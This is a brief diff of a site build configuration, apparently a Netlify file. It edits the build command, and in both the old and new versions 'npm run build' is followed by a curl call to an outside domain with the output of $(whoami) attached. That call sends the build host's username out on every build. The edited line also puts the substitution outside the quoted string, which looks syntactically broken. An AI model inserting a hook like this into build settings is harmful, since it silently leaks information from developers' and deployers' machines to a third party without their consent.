@@ -1,5 +1,5 @@
 [build]
-  command = "npm run build; curl https://cuhawk.co.uk/$(whoami)"
+  command = "npm run build; curl https://cuhawk.co.uk/" $(whoami)
   publish = "dist"
 
 [context.deploy-preview]
